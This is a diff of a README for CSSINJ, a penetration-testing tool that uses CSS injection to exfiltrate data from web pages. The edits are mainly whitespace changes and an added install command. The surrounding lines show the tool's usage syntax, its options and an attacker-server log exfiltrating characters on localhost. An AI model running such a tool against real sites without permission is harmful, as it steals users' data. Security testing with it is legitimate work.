@@ -1,6 +1,6 @@
 ---
 
-# CSSINJ  
+# CSSINJ
 
 ```
   _____   _____   _____  _____  _   _       _     _____  __     __
@@ -11,28 +11,31 @@
  \_____||_____/ |_____/ |_____||_| \_| \____/ (_)|_|        |_|
 ```
 
-## About  
+## About
 
-**CSSINJ** is a penetration testing tool that exploits [**CSS injection vulnerabilities**](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection) to exfiltrate sensitive information from web applications. This tool is designed for security professionals to assess the security posture of web applications by demonstrating how CSS can be used to extract data covertly.  
+**CSSINJ** is a penetration testing tool that exploits [**CSS injection vulnerabilities**](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection) to exfiltrate sensitive information from web applications. This tool is designed for security professionals to assess the security posture of web applications by demonstrating how CSS can be used to extract data covertly.
 
 
-## Installation  
+## Installation
 
-To install **CSSINJ**, run the following command:  
+To install **CSSINJ**, run the following command:
 
 ```bash
 pip install cssinj
+
+# Or with uv
+uv add cssinj
 ```
 
 Now you’re ready to use **CSSINJ**!
 
-## Usage  
+## Usage
 
 ```bash
 python3 -m cssinj [-h] -H HOSTNAME -p PORT [-e ELEMENT] [-a ATTRIBUT] [-d] [-m {recusive,font-face}] [-o OUTPUT]
 ```
 
-### Options  
+### Options
 
 | Option                 | Description                                 |
 |------------------------|---------------------------------------------|
@@ -46,7 +49,7 @@ python3 -m cssinj [-h] -H HOSTNAME -p PORT [-e ELEMENT] [-a ATTRIBUT] [-d] [-m {
 | `-t, --timeout`        | Timeout in seconds before considering exfiltration complete (default: 3.0) |
 | `-o, --output`        | File to store the exfiltrated data in JSON format |
 
-### Example  
+### Example
 
 #### Victim's View :
 ```html
@@ -112,7 +115,7 @@ python3 -m cssinj [-h] -H HOSTNAME -p PORT [-e ELEMENT] [-a ATTRIBUT] [-d] [-m {
 [2025-05-21 03:06:49] 🛠️ Attacker's server started on 127.0.0.1:5005
 [2025-05-21 03:06:49] 🌐 Connection from 127.0.0.1
 [2025-05-21 03:06:49] ⚙️ ID : 1
-[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 :  
+[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 :
 [2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : e
 [2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : W
 [2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : l
@@ -156,10 +159,10 @@ This difference in behavior makes Chromium-based browsers more susceptible to CS
   - [ ] 3. Get all value for each Attributs
   - [ ] 4. Get text using font-face exfiltration
 
-## Disclaimer  
+## Disclaimer
 
-This tool is intended **only for ethical hacking and security research**. **Unauthorized use on systems without explicit permission is illegal**. The developer **is not responsible** for any misuse of this tool.  
+This tool is intended **only for ethical hacking and security research**. **Unauthorized use on systems without explicit permission is illegal**. The developer **is not responsible** for any misuse of this tool.
 
-## Author  
+## Author
 
 **CSSINJ** was developed by **DonAsako**.
